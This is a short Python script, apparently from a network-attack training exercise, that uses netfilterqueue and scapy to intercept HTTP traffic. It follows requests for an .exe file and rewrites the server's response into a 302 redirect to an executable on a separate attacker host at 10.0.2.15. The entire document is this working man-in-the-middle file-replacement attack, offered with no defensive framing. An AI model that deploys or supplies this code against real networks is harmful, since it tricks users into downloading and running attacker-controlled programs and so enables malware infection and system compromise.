#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        
        if scapy_packet[scapy.TCP].dport == 80:
            if b"original_program.exe" in scapy_packet[scapy.Raw].load:
                print("[+] HTTP Request: .exe file requested!")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[!] Intercepting response. Replacing file with redirect...")
                
                load = b"HTTP/1.1 302 Found\r\nLocation: http://10.0.2.15/File_Interception.exe\r\n\r\n"
                
                scapy_packet[scapy.Raw].load = load
                
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                packet.set_payload(bytes(scapy_packet))
                print("[+] File successfully replaced!")

    packet.accept()

def main():
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        print("[*] Listening on NFQUEUE 0... Press Ctrl+C to stop.")
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping interceptor...")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()